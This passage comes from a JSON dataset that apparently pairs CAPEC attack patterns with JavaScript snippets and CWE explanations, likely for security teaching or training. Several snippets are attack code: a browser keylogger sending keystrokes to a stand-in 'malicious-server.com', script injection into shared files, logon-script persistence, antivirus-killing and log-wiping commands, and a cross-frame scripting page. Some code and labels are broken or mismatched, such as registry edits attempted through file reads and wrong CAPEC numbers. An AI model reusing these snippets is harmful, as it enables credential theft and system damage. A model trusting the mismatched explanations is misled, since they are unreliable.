        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Path to the shared directory\nconst sharedDir = '/shared/files';\n\n// Malicious script to be injected\nconst maliciousScript = '<script>alert(\"Hacked!\");</script>';\n\n// Function to inject malicious script into a shared file\nfunction injectMaliciousScript(fileName) {\n  const filePath = path.join(sharedDir, fileName);\n  \n  // Check if the file exists\n  if (fs.existsSync(filePath)) {\n    // Read the original content\n    let content = fs.readFileSync(filePath, 'utf8');\n    \n    // Inject the malicious script\n    content += maliciousScript;\n    \n    // Write the modified content back to the file\n    fs.writeFileSync(filePath, content, 'utf8');\n    console.log(`Injected malicious script into ${fileName}`);\n  } else {\n    console.log(`File ${fileName} does not exist.`);\n  }\n}\n\n// Example usage\ninjectMaliciousScript('example.html');",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary injects a malicious script into a shared file. The code targets a shared directory and appends a malicious script to an existing file. This embodies the CAPEC 'Modify Shared File' by showing how an attacker can manipulate shared content to include harmful code. The code also touches on related CWEs: it does not implement proper access control (CWE-284), it assumes insecure permissions on the shared file (CWE-378), and it does not verify the integrity of the file before modifying it (CWE-494). The example usage shows how the function can be called to inject a script into a specific file."
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst fs = require('fs');\nconst path = require('path');\n\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n    res.send('File uploaded!');\n  });\n});\n\napp.get('/uploads/:filename', (req, res) => {\n  let filePath = path.join(__dirname, 'uploads', req.params.filename);\n  res.sendFile(filePath);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that allows file uploads and serves the uploaded files. The code demonstrates several vulnerabilities related to the CAPEC description and associated CWEs:\n\n1. **Improper Access Control (CWE-284)**: The uploaded files are stored in a directory ('uploads') that is directly accessible via the web server without any access control, allowing unauthorized users to access potentially sensitive files.\n\n2. **Storage of File with Sensitive Data Under Web Root (CWE-219)**: The uploaded files are stored under the web root directory, making them accessible to anyone who knows the URL.\n\n3. **Unparsed Raw Web Content Delivery (CWE-433)**: The server delivers files based on their path without parsing or validating the content, which could lead to the execution of malicious scripts.\n\n4. **Reliance on File Name or Extension of Externally-Supplied File (CWE-646)**: The server relies on the file name and extension provided by the user to store and serve the file, which could be exploited to upload and execute malicious files.\n\n5. **Download of Code Without Integrity Check (CWE-494)**: The server does not perform any integrity checks on the uploaded files, allowing potentially malicious files to be uploaded and executed."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "const fs = require('fs');\nconst logonScriptPath = '/etc/profile.d/logon.sh';\n\n// CWE-798: Use of Hard-coded Credentials\nconst hardCodedPassword = 'password123';\n\n// CWE-284: Improper Access Control\nfs.chmodSync(logonScriptPath, '777');\n\n// CWE-520: .NET Misconfiguration: Use of Impersonation (simulated in JS)\nfunction runAsAdmin(command) {\n  // Simulate running a command with elevated privileges\n  console.log(`Running command as admin: ${command}`);\n}\n\n// CWE-603: Use of Client-Side Authentication\nfunction authenticateUser(username, password) {\n  if (username === 'admin' && password === hardCodedPassword) {\n    return true;\n  }\n  return false;\n}\n\n// Main idea: Modify logon script to maintain persistence\nif (authenticateUser('admin', 'password123')) {\n  const maliciousCode = '\\necho \"Malicious code executed\"';\n  fs.appendFileSync(logonScriptPath, maliciousCode);\n  runAsAdmin('chmod +x ' + logonScriptPath);\n  console.log('Logon script modified to include malicious code.');\n} else {\n  console.log('Authentication failed.');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker modifies a logon script to maintain persistence on a system. The code includes several vulnerabilities: \n1. CWE-798: Hard-coded credentials are used for authentication.\n2. CWE-284: Improper access control is demonstrated by setting the logon script's permissions to be world-writable.\n3. CWE-520: Simulated impersonation to run commands with elevated privileges.\n4. CWE-603: Client-side authentication is used, which can be bypassed.\n\nThe main idea is to show how an attacker can exploit these weaknesses to insert malicious code into a logon script, which will be executed every time a user logs on, thereby maintaining persistence on the system."
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "const users = ['user1', 'user2', 'user3'];\nconst passwords = ['password123', 'welcome1', 'letmein'];\n\nfunction authenticate(username, password) {\n  // Simulate a weak password check\n  if (users.includes(username) && passwords.includes(password)) {\n    console.log('Authentication successful for', username);\n  } else {\n    console.log('Authentication failed for', username);\n  }\n}\n\n// Password spraying attempt\nfor (let password of passwords) {\n  for (let user of users) {\n    authenticate(user, password);\n  }\n}",
        "description": "This JavaScript code snippet simulates a password spraying attack. It defines a list of users and a list of common passwords. The `authenticate` function checks if the provided username and password are in the respective lists, simulating a weak password check (CWE-521). The nested loops represent the password spraying technique, where each password is tried for each user account before moving on to the next password. This approach helps avoid rapid account lockouts (CWE-307). The code highlights the vulnerability of systems relying on weak password requirements and single-factor authentication (CWE-308, CWE-309)."
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "const crypto = require('crypto');\n\nfunction hashPassword(password) {\n  const hash = crypto.createHash('sha256');\n  hash.update(password);\n  return hash.digest('hex');\n}\n\nconst password = 'user_password';\nconst hashedPassword = hashPassword(password);\nconsole.log('Hashed Password:', hashedPassword);",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of password hashing. The `hashPassword` function uses the SHA-256 hashing algorithm to hash a password without incorporating a salt. This approach is vulnerable to precomputed hash attacks (rainbow tables) because the same password will always produce the same hash. The code embodies the main idea of the deprecated CAPEC 'Dump Password Hashes' by showing how password hashes can be generated insecurely. It also relates to CWE-759 (Use of a One-Way Hash without a Salt) and CWE-760 (Use of a One-Way Hash with a Predictable Salt) by illustrating the lack of a salt in the hashing process."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\n// Using an obsolete function to read a file\nfs.readFileSync('/path/to/sensitive/data.txt', 'utf8', (err, data) => {\n  if (err) throw err;\n  console.log(data);\n});\n\n// Using DNS lookup in a security decision\nconst hostname = 'example.com';\ndns.lookup(hostname, (err, address) => {\n  if (err) throw err;\n  if (address === '192.168.1.1') {\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates two key vulnerabilities: the use of an obsolete function and reliance on DNS lookups for security decisions. The `fs.readFileSync` function is used to read sensitive data from a file, which is an obsolete method and suggests that the code has not been actively maintained (CWE-477). Additionally, the code uses a DNS lookup to make a security decision, granting access based on the resolved IP address of a hostname (CWE-247). This approach is insecure because DNS responses can be spoofed, leading to potential security breaches. The code embodies the deprecated CAPEC concept of obtaining data via utilities, highlighting the risks associated with using outdated methods and insecure practices."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "document.addEventListener('keydown', function(event) {\n  let keylog = localStorage.getItem('keylog') || '';\n  keylog += event.key;\n  localStorage.setItem('keylog', keylog);\n});\n\n// Simulate sending the captured keystrokes to an attacker\nfunction sendKeylog() {\n  let keylog = localStorage.getItem('keylog');\n  if (keylog) {\n    fetch('http://malicious-server.com/steal', {\n      method: 'POST',\n      headers: {\n        'Content-Type': 'application/json'\n      },\n      body: JSON.stringify({ data: keylog })\n    });\n  }\n}\n\n// Call the function periodically\nsetInterval(sendKeylog, 60000);",
        "description": "This JavaScript code snippet demonstrates a simple keylogger that captures all keystrokes made by a user and stores them in the browser's local storage. The 'keydown' event listener logs each key pressed by the user. The 'sendKeylog' function simulates sending the captured keystrokes to a malicious server every 60 seconds. This code embodies the main idea of CAPEC-564 (Capture Credentials via Keylogger) by showing how an adversary can capture user credentials through keystroke logging. The related CWEs provide context on potential weaknesses, such as insufficiently protected credentials (CWE-522) and weak password requirements (CWE-521), which can be exploited by such an attack."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  if (req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Log sensitive information to a file\n      fs.appendFile('user_data.log', body, (err) => {\n        if (err) throw err;\n      });\n      res.end('Data received');\n    });\n  } else {\n    res.end('Send a POST request');\n  }\n}).listen(8080, () => console.log('Server running on port 8080'));\n",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests. When a POST request is received, it captures the data sent by the user and logs it to a file named 'user_data.log'. This embodies the main idea of CAPEC-Collect Data as Provided by Users, where an attacker captures information that a user legitimately enters into a system. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by logging potentially sensitive user data to a file without proper access controls, and CWE-214 (Invocation of Process Using Visible Sensitive Information) by potentially exposing the logged data to unauthorized processes."
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const user = queryObject.user;\n\n  // Deprecated function usage\n  if (user == 'admin') {\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.write('Welcome Admin!');\n  } else {\n    res.writeHead(401, {'Content-Type': 'text/html'});\n    res.write('Unauthorized');\n  }\n  res.end();\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server that checks for a 'user' query parameter in the URL. If the 'user' parameter is 'admin', it grants access; otherwise, it denies access. The code demonstrates the use of deprecated functions and unchecked error conditions. Specifically, it uses the deprecated 'url.parse' function and does not handle potential errors or exceptions that may arise from parsing the URL or processing the request. This embodies the main idea of the CAPEC by showing how deprecated functions and unchecked error conditions can lead to security vulnerabilities, such as authentication bypass and reliance on obsolete functions."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "const fs = require('fs');\nconst logFilePath = '/var/log/app.log';\n\n// Function to block logging\nfunction blockLogging() {\n  fs.writeFileSync(logFilePath, ''); // Clear the log file\n  fs.chmodSync(logFilePath, 0o000); // Remove all permissions\n}\n\n// Simulate an attack that blocks logging\nblockLogging();\n\n// Example of insufficient logging\nfunction logEvent(event) {\n  // Only log event type, omitting important details\n  fs.appendFileSync(logFilePath, `Event: ${event.type}\\n`);\n}\n\n// Example of logging sensitive information\nfunction logSensitiveData(data) {\n  fs.appendFileSync(logFilePath, `Sensitive Data: ${data}\\n`);\n}\n\n// Example usage\nlogEvent({ type: 'LOGIN_ATTEMPT' });\nlogSensitiveData('User password: 12345');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Block Logging to Central Repository' by simulating an attack that clears and blocks the log file, preventing any logging activities. The `blockLogging` function clears the log file and removes all permissions to block further logging. The `logEvent` function represents insufficient logging by only logging the event type and omitting important details. The `logSensitiveData` function demonstrates the insertion of sensitive information into the log file. This code embodies the main idea of the CAPEC by showing how an adversary can prevent logs from being delivered to a central location and includes related CWE weaknesses for additional context."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction uploadFile(filePath, fileContent) {\n  // CWE-434: Unrestricted upload of file with dangerous type\n  if (path.extname(filePath) !== '.txt') {\n    throw new Error('Only .txt files are allowed');\n  }\n\n  // CWE-646: Reliance on file name or extension of externally-supplied file\n  if (filePath.includes('..')) {\n    throw new Error('Invalid file path');\n  }\n\n  // CWE-774: Allocation of file descriptors without limits\n  const maxFiles = 100;\n  const openFiles = fs.readdirSync('/uploads').length;\n  if (openFiles >= maxFiles) {\n    throw new Error('File limit reached');\n  }\n\n  // CWE-409: Improper handling of highly compressed data\n  if (fileContent.length > 1000000) { // Arbitrary large size\n    throw new Error('File content too large');\n  }\n\n  // Artificially inflate file size\n  const inflatedContent = fileContent + ' '.repeat(1000000); // Add 1MB of spaces\n  fs.writeFileSync(path.join('/uploads', filePath), inflatedContent);\n}\n\n// Example usage\ntry {\n  uploadFile('example.txt', 'Hello, World!');\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a file upload function that embodies the concept of artificially inflating file sizes. The function includes checks to prevent several related vulnerabilities: it restricts file types to .txt (CWE-434), validates file paths to avoid directory traversal (CWE-646), limits the number of open file descriptors (CWE-774), and checks for excessively large file content to prevent data amplification (CWE-409). The main idea of the CAPEC is represented by artificially inflating the file size by appending 1MB of spaces to the file content before saving it."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nexec('ps aux', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error executing command: ${error}`);\n    return;\n  }\n  console.log(`Running processes:\\n${stdout}`);\n});",
        "description": "This JavaScript code snippet uses Node.js to execute the 'ps aux' command, which lists all running processes on a Unix-like operating system. The output of this command is then printed to the console. This embodies the main idea of CAPEC-170 (Process Footprinting) by exposing information about the currently running processes. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) because it reveals potentially sensitive information about the system's processes to any user who can run this script. Additionally, it touches on CWE-214 (Invocation of Process Using Visible Sensitive Information) as the command and its output can be seen by other processes."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction getServiceInfo() {\n  exec('tasklist /svc', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Service Information: ${stdout}`);\n  });\n}\n\ngetServiceInfo();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command ('tasklist /svc') that retrieves information about the services running on the target system. The 'exec' function from the 'child_process' module is used to run the command. The output, which includes sensitive system information, is then printed to the console. This code embodies the main idea of the CAPEC 'Services Footprinting' by demonstrating how an adversary could exploit functionality meant for authorized users to gather information about the services on a target system. The related CWEs are represented by the exposure of sensitive information (CWE-200, CWE-497) and the invocation of a process with visible sensitive information (CWE-214)."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction getUserAccounts() {\n  exec('net user', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error executing command: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Error in command output: ${stderr}`);\n      return;\n    }\n    console.log(`User Accounts: ${stdout}`);\n  });\n}\n\ngetUserAccounts();",
        "description": "This JavaScript code snippet uses Node.js's 'child_process' module to execute the 'net user' command, which lists all user accounts on a Windows system. The output of this command is then logged to the console. This embodies the main idea of the CAPEC 'Account Footprinting' by demonstrating how an adversary could exploit system commands to gather information about domain accounts. The code also touches on related CWEs, such as the exposure of sensitive information (CWE-200) and the invocation of a process using visible sensitive information (CWE-214), as the command output could reveal sensitive user account details to unauthorized actors."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction listLocalGroups() {\n  exec('net localgroup', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Local Groups: ${stdout}`);\n  });\n}\n\nlistLocalGroups();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command that lists local groups on a Windows system. The 'exec' function from the 'child_process' module is used to run the 'net localgroup' command, which outputs information about user groups and their permissions. This embodies the main idea of the CAPEC by demonstrating how an adversary could exploit functionality meant to identify information about user groups and their permissions. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing group information to unauthorized users, and CWE-214 (Invocation of Process Using Visible Sensitive Information) by running a command that could reveal sensitive information."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction getUserLastLoginTimes(directory) {\n  const users = fs.readdirSync(directory);\n  const userLoginTimes = {};\n\n  users.forEach(user => {\n    const userFilePath = path.join(directory, user, 'ntuser.dat');\n    if (fs.existsSync(userFilePath)) {\n      const stats = fs.statSync(userFilePath);\n      userLoginTimes[user] = stats.mtime;\n    }\n  });\n\n  return userLoginTimes;\n}\n\nconst userDirectory = '/path/to/user/directory';\nconst loginTimes = getUserLastLoginTimes(userDirectory);\nconsole.log(loginTimes);",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit the 'Owner Footprinting' vulnerability by accessing the last modified times of 'ntuser.dat' files in a given directory. The code reads the directory, checks for the existence of 'ntuser.dat' files for each user, and retrieves the last modified time, which can indicate the last login time of the user. This information can be used to inform further targeted attacks. The code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by exposing user login times, CWE-214 (Invocation of Process Using Visible Sensitive Information) by potentially logging sensitive information, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by accessing system-level information without proper authorization."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "const exec = require('child_process').exec;\n\n// Hard-coded credentials (CWE-798)\nconst adminPassword = 'admin123';\n\n// Function to disable security software\nfunction disableSecuritySoftware(password) {\n  if (password === adminPassword) { // Improper Access Control (CWE-284)\n    // Command to kill a security software process (e.g., antivirus)\n    exec('taskkill /F /IM antivirus.exe', (error, stdout, stderr) => {\n      if (error) {\n        console.error(`Error: ${error.message}`);\n        return;\n      }\n      if (stderr) {\n        console.error(`Stderr: ${stderr}`);\n        return;\n      }\n      console.log(`Stdout: ${stdout}`);\n    });\n  } else {\n    console.log('Access Denied: Incorrect Password');\n  }\n}\n\ndisableSecuritySoftware('admin123');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can disable security software by exploiting improper access control (CWE-284) and using hard-coded credentials (CWE-798). The function `disableSecuritySoftware` takes a password as an argument and checks it against a hard-coded admin password. If the password matches, it executes a command to kill a security software process (e.g., antivirus). This represents the CAPEC 'Disable Security Software' by showing how an attacker could disable security tools to avoid detection."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "const fs = require('fs');\nconst registryKey = 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\Userinit';\nconst maliciousDllPath = 'C:\\\\malicious\\\\malicious.dll';\n\nfunction replaceWinlogonHelperDLL() {\n  try {\n    // Read the current registry value\n    let currentValue = fs.readFileSync(registryKey, 'utf8');\n    console.log('Current Userinit value:', currentValue);\n\n    // Replace the Userinit value with the path to the malicious DLL\n    fs.writeFileSync(registryKey, maliciousDllPath, 'utf8');\n    console.log('Userinit value replaced with malicious DLL path');\n  } catch (err) {\n    console.error('Error modifying registry key:', err);\n  }\n}\n\nreplaceWinlogonHelperDLL();",
        "description": "This JavaScript code snippet demonstrates how an attacker might exploit the 'Replace Winlogon Helper DLL' vulnerability by modifying a registry key to load a malicious DLL at startup. The code reads the current value of the 'Userinit' registry key and replaces it with the path to a malicious DLL. This embodies CWE-15 (External Control of System or Configuration Setting) as it allows external control over a critical system setting. The code also indirectly touches on CWE-427 (Uncontrolled Search Path Element) by assuming the malicious DLL will be loaded from a specified path. The snippet is a simplified representation and would require additional privileges and context to execute on a real system."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  const url = req.url;\n  if (url === '/config') {\n    // CWE-204: Observable Response Discrepancy\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Configuration: Debug Mode ON');\n  } else if (url === '/status') {\n    // CWE-208: Observable Timing Discrepancy\n    setTimeout(() => {\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Status: OK');\n    }, 1000); // Deliberate delay\n  } else if (url === '/info') {\n    // CWE-497: Exposure of Sensitive System Information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('System Info: OS=Linux, Version=4.15.0');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens on port 8080. The server responds to different URL paths with specific information, demonstrating several vulnerabilities:\n\n1. **CWE-204: Observable Response Discrepancy** - When accessing '/config', the server reveals internal configuration details (e.g., 'Debug Mode ON').\n2. **CWE-208: Observable Timing Discrepancy** - When accessing '/status', the server introduces a deliberate delay before responding, which can be used to infer the server's internal state or processing logic.\n3. **CWE-497: Exposure of Sensitive System Information** - When accessing '/info', the server exposes sensitive system information (e.g., OS and version).\n\nThese behaviors can be exploited by an adversary to gather information about the system, aligning with the concept of 'System Footprinting' described in the CAPEC."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "const exec = require('child_process').exec;\n\nfunction getSecurityTools() {\n  exec('wmic product get name, version', (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Installed Security Tools: ${stdout}`);\n  });\n}\n\ngetSecurityTools();",
        "description": "This JavaScript code snippet uses Node.js to execute a system command that lists all installed software products, including security tools, on a Windows system. The 'wmic product get name, version' command is used to retrieve the names and versions of installed software. The code captures the output and logs it to the console. This embodies the main idea of CAPEC-170 (Security Software Footprinting) by attempting to gather information about installed security tools. The code also touches on CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by potentially exposing sensitive information about installed security software to unauthorized users."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n    if (!isValidEndpoint(socket.remoteAddress)) {\n      console.log('Unauthorized endpoint detected.');\n      socket.destroy();\n      return;\n    }\n\n    // CWE-924: Improper Enforcement of Message Integrity During Transmission\n    if (!isMessageIntegrityValid(data)) {\n      console.log('Message integrity compromised.');\n      socket.destroy();\n      return;\n    }\n\n    // Process the data\n    console.log('Data received:', data.toString());\n  });\n\n  socket.on('error', (err) => {\n    console.log('Socket error:', err.message);\n  });\n});\n\nserver.listen(8080, '127.0.0.1', () => {\n  console.log('Server listening on port 8080');\n});\n\nfunction isValidEndpoint(address) {\n  // Placeholder function to validate endpoint\n  return address === '127.0.0.1';\n}\n\nfunction isMessageIntegrityValid(data) {\n  // Placeholder function to check message integrity\n  return data.toString().includes('valid');\n}",
        "description": "This JavaScript code snippet creates a simple TCP server using the 'net' module. The server listens for incoming connections and processes data received from clients. The code includes checks to address several CWEs related to the CAPEC 'Route Disabling' attack pattern:\n\n1. CWE-923: The server checks if the incoming connection is from a valid endpoint using the 'isValidEndpoint' function. If the endpoint is unauthorized, the connection is terminated.\n\n2. CWE-924: The server verifies the integrity of the received message using the 'isMessageIntegrityValid' function. If the message integrity is compromised, the connection is terminated.\n\nThe main idea represented by this code is to ensure that the communication channel is restricted to intended endpoints and that the integrity of messages is enforced during transmission. This helps prevent unauthorized access and potential route disabling attacks by severing connections that do not meet security criteria."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "const fs = require('fs');\n\nfunction disableNetworkHardware() {\n  try {\n    // Simulate disabling network hardware by modifying a critical configuration file\n    fs.writeFileSync('/etc/network/interfaces', '');\n    console.log('Network hardware disabled.');\n  } catch (err) {\n    console.error('Failed to disable network hardware:', err);\n  }\n}\n\ndisableNetworkHardware();",
        "description": "This JavaScript code snippet simulates the disabling of network hardware by modifying a critical configuration file. The `disableNetworkHardware` function attempts to overwrite the '/etc/network/interfaces' file, which is typically used to configure network interfaces on Unix-like systems. By writing an empty string to this file, the code effectively disables the network hardware, preventing it from performing its intended service. This action embodies the main idea of the CAPEC 'Disabling Network Hardware' by demonstrating how an adversary could disrupt network services. The code also touches on related CWEs, such as improper restriction of software interfaces to hardware features (CWE-1256) and improper protection for outbound error messages and alert signals (CWE-1320), by showing how software can be used to manipulate hardware configurations without proper safeguards."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "const net = require('net');\n\nconst BGP_PORT = 179;\nconst TARGET_AS = '192.0.2.1';\nconst MALICIOUS_ROUTE = '203.0.113.0/24';\n\nconst client = new net.Socket();\nclient.connect(BGP_PORT, TARGET_AS, () => {\n  console.log('Connected to BGP router');\n  // Send a BGP update message to withdraw a legitimate route\n  const withdrawMessage = Buffer.from('withdraw legitimate route data');\n  client.write(withdrawMessage);\n  // Send a BGP update message to advertise a malicious route\n  const maliciousMessage = Buffer.from(`advertise ${MALICIOUS_ROUTE}`);\n  client.write(maliciousMessage);\n});\n\nclient.on('data', (data) => {\n  console.log('Received:', data.toString());\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of a BGP Route Disabling attack. It connects to a BGP router on the standard BGP port (179) and sends a message to withdraw a legitimate route, followed by a message to advertise a malicious route. This can disrupt the network traffic by making the legitimate network inaccessible and redirecting traffic through a less efficient or malicious route. The code embodies the main idea of the CAPEC by manipulating BGP advertisements to deny availability of the target network. The related CWEs provide context for potential weaknesses, such as incorrect destination specification, insufficient control of network message volume, and improper enforcement of message integrity."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const redirectUrl = queryObject.redirect;\n\n  // CWE-601: Open Redirect\n  if (redirectUrl) {\n    res.writeHead(302, { 'Location': redirectUrl });\n    res.end();\n    return;\n  }\n\n  // CWE-79: Cross-site Scripting (XSS)\n  const userInput = queryObject.input;\n  if (userInput) {\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end(`<h1>${userInput}</h1>`);\n    return;\n  }\n\n  // CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\n  const clientIp = req.connection.remoteAddress;\n  require('dns').reverse(clientIp, (err, hostnames) => {\n    if (err) {\n      res.writeHead(500);\n      res.end('Error in DNS resolution');\n      return;\n    }\n    res.writeHead(200, { 'Content-Type': 'text/plain' });\n    res.end(`Hello, your hostname is ${hostnames[0]}`);\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that demonstrates several security weaknesses related to the CAPEC 'DNS Domain Seizure'. The server handles three types of requests:\n\n1. **Open Redirect (CWE-601)**: If the query parameter 'redirect' is present, the server redirects the user to the specified URL without validation, which can be exploited for phishing attacks.\n\n2. **Cross-site Scripting (XSS) (CWE-79)**: If the query parameter 'input' is present, the server includes it directly in the HTML response without sanitization, making it vulnerable to XSS attacks.\n\n3. **Reliance on Reverse DNS Resolution for a Security-Critical Action (CWE-350)**: The server performs a reverse DNS lookup on the client's IP address and uses the result in the response. This can be exploited if the DNS resolution is manipulated.\n\nThese vulnerabilities illustrate how an attacker could exploit weaknesses in DNS handling and web application security to disrupt services or perform malicious actions, aligning with the concept of DNS Domain Seizure."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "const net = require('net');\n\nclass SensitiveData {\n  constructor(secret) {\n    this.secret = secret;\n  }\n}\n\nfunction deserialize(data) {\n  return JSON.parse(data);\n}\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    try {\n      const obj = deserialize(data);\n      if (obj instanceof SensitiveData) {\n        console.log('Sensitive data received:', obj.secret);\n      } else {\n        console.log('Received object:', obj);\n      }\n    } catch (e) {\n      console.error('Deserialization error:', e);\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\nconsole.log('Server listening on port 1337');",
        "description": "This JavaScript code snippet demonstrates a simple TCP server that deserializes incoming data using JSON.parse. The server listens for incoming connections and attempts to deserialize any received data. If the deserialized object is an instance of the SensitiveData class, it logs the sensitive data to the console. This code is vulnerable to object injection attacks, as it deserializes untrusted data without proper validation. An attacker could exploit this by sending a malicious payload that, when deserialized, could lead to remote code execution or other unintended behaviors. The code also highlights the risk of serializing classes containing sensitive data (CWE-499) and the potential for embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "<html>\n<head>\n  <title>Malicious Page</title>\n</head>\n<body>\n  <h1>Welcome to the Malicious Page</h1>\n  <iframe id=\"legitFrame\" src=\"https://legitimate-website.com\" style=\"display:none;\"></iframe>\n  <script>\n    // Wait for the iframe to load\n    document.getElementById('legitFrame').onload = function() {\n      var iframe = document.getElementById('legitFrame').contentWindow;\n      // Attempt to interact with the legitimate page\n      try {\n        // Example of XSS vulnerability exploitation\n        iframe.document.body.innerHTML += '<img src=\"x\" onerror=\"alert(\\'XSS Attack\\')\">';\n        // Example of CSRF attack\n        iframe.document.forms[0].submit();\n      } catch (e) {\n        console.log('Interaction with iframe failed:', e);\n      }\n    };\n  </script>\n</body>\n</html>",
